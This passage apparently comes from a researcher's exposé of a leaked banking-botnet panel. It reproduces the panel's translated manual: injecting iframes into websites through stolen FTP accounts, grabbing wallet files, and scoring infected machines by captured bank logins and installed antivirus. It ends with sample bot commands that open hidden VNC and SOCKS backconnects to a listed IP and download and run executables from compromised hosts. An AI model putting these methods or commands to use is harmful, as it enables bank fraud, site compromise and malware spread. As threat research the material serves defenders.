This will work even if the file is not specified under \"FileSearch\"\nconfig entry.\nAuto download - uploads files with a given mask without a need to specify BotID. Bot will\nexecute the upload as soon as search conditions are given and the file found. This will work\neven if the file is not specified under \"FileSearch\" config entry.\nBe careful using File Hunter to modify any files on the bot. It's main purpose is to grab *coin\nfiles(multibit.dat/litecoin.dat...)\nUse mouse right-click to access context menu for file list.\n\n**Q: Short manual for FTP Iframer**\n**A: As in the case with 'Mailer', For this feature to work correctly you need to download the**\niframer script [Download Script] and put it in www-root directory on one of the hosts that will\nbe used to perform the mass-email campaign - make sure you turn off the following in\nphp.ini; magic_quotes_gpc = Off and safe_mode = Off\nNext, create configuration options by pressing on [ Конфигурация ]\nSpecify the script URL in URL field\n\n\n-----\n\nWorking mode: Just checking [ Will check the validity of FTP accounts found in the logs ]\nInject: [Mode: \"ON\"]\nInject method: Smart/Add/Overwrite [ Smart - will re-add the inject in case if it was detected\nand deleted. / Add - iframe code will be added to the end of the file before </body></html>]\nLookup depth: [ File search level on ftp-host. For example, in the following structure FTP\nConnection > public_html(1) > images(2) > gif(3)....]\nNext, perform 'Accounts search' and 'Run tasks'. The statistics and results will be available\nafter a few minutes. The script will be working in cron-mode after the first execution, so there\nis no need to keep the page opened.\n\n**Q: Main functions and methods of \"Neuromodel\"**\n**A: Neuromodel allows you to perform complex analysis of your botnet: identifying best bots,**\nupload success rates. You can build a research matrix that includes list of bots and evaluate\nthem against specified criteria; the result will be calculating a score to each bot.\nEach research matrix can contain a number of evaluation criteria. For example, you need to\nsearch the logs for the following data: Bank Acc + CC or Bank Acc + ISP E-mail\nCreate profile first and then plan the task based on required criteria.\n\nTask - \"Find bots that logged into http://www.bankofamerica.com id=* in the last 30 days and\nwhere McAfee is installed. Assign X score if the search criteria match\"\n\nCreating criteria:\n1) { name: BOA LOGIN | criteria: HTTP data POST | URL masks:\nhtt*://www.bankofamerica.com/* | POST data masks: id=* | days limit: 30 | score: 1 | static\nmethod, trigger condition: No < 1 }\n2) { name: AVCheck | criteria: installed software | software name mask: McAfee* | days limit:\n30 | score: 1 trigger condition: No < 1 }\n\nStatic method is used to summarize the results.\n\n- **No**: simple summary. Each successful criteria match adds specified score to the bot.\nMore matches = bigger the score.\nExample 1: if it found 180 reports matching the criteria and the score is 2 then the final score\nwill be '180*2'\nExample 2: if 'Login to bankofamerica' criteria is set to \">=\" \"3\" on average a day then the\nscore will be added only for the last days specified in 'Days' parameter.\nDetailed: if in the last days specified in 'Days' parameter the 'Login to bankofamerica' criteria\nwas matched more than 3 times on average then the bots reported will be given the score\npoints.\n\n- **Sum** Summary of produced reports\nScore 'Points' will be added if the amount of reports satisfying the search criteria complies\nwith trigger condition.\nFor example, if we have `reports_count=180` and `Points=2` and trigger condition is `>= 180`\nthen the score is +2.\n\n- **Days**: active days summary: days containing the reports\n\n\n-----\n\nScore will be added if the amount of reports satisfying the search criteria complies with\ntrigger condition.\nFor example, if we have reports from day before yesterday, yesterday and today and trigger\ncondition is set to `>= 3` then the scores will be added.\n\n- **Avg/Day**: Average/Day: average number of reports in the last 24 hours\n\n- **Avg/Week**: Average/Week: average number of reports per week\n\n- **Days/Week**: average number of active days per week\n\nAnother example, search for inactive accounts:\n\"Find the bots regardless of their scores that logged into USBank in the last 21 days no more\nthan 3 times - no filters or criteria are applied\"\n\n1) { URL = https://onlinebanking.usbank.com/Auth/Login/Login* | HTTP URL visit| days limit\n= 21 | Login no more than 3 times: e.g. login <=3. Meaning, if found <=3 reports for this\ncriteria — add 1 to the score. | SUM() <=3, 1 score }\n\nFull criteria list is below:\nCondition using date/time of the first report received from the bot.\nCondition using date/time of the last report received from the bot.\nCondition using average online time of the bot per week or per hour.\nCondition using a type of the report or it's content\n>Presence/Lack of LUHN10(CC)\n>Presence/Lack of ISP email address (pop3 or web-link)\n>Presence/Lack of FTP accounts\n>Search by key words\nCondition using \"Installed Software\" reports, allows you to check for a particular software\ninstalled on the bot.\nCondition using \"CMD\" reports, allows to use particular keywords.\nCondition using visited one or many particular URLs\nCondition using POST variables.\nMinus some absolute nonsense in the description of AVG/Day, AVG/week and days/weeks\nThe author is a fecking lunatic trying to explain things that only he understand :)\nThanks to Malwageddon for the translation help.\n\nNow.. take a free tour in the infrastructure.\n\nLogin:\n\n\n-----\n\nDashboard:\n\nRU and UA flags, united forever :)\n\nexe configuration:\n\n\n-----\n\nOperating system:\n\nSoftware:\n\n\n-----\n\n-----\n\nFirewall:\n\n\n-----\n\nAV:\n\nSearch:\n\n\n-----\n\nBots:\n\nLegend:\n\n\n-----\n\nFull information:\n\nWebInject:\n\nReported errors:\n\n\n-----\n\nNew group:\n\nEdit a webinject:\n\n\n-----\n\nWebinjects for the group 'Canada':\n\n\n-----\n\nUS:\n\nEdit a webinject:\n\nScript:\n\n\n-----\n\nScript edit:\n\nSome scripts sample:\ntokenspy_update tokenspy-config.json\nhvnc_start 176.9.174.237 29223\nbot_bc_add vnc\nbot_bc_add socks 176.9.174.237 37698\nuser_execute http://iguana58.ru/plugins/system/anticopy/ammy.exe\ntransfer\n\n\n-----\n\nuser_destroy\nuser_execute http://iguana58.ru/plugins/system/anticopy/adobe.exe\nuser_ftpclients_get\nuser_execute htxp://iguana58.ru/plugins/system/anticopy/adobe.exe\nuser_execute htxp://mareikes.com/wp-includes/pomo/svhost.exe -f\nuser_execute htxp://mareikes.com/wp-includes/pomo/server.exe\nuser_execute htxp://mareikes.com/wp-includes/pomo/ammy.exe\nuser_execute http://tehnoart.co/sr.exe -f\nuser_execute http://3dmaxkursum.net/tmp/sys/config.exe\nuser_execute http://coasttransit.com/wp-content/gallery/gulfport-transitcenter/thumbs/htasees.exe\n\n- dns: 1 ›› ip: 185.4.73.33 -
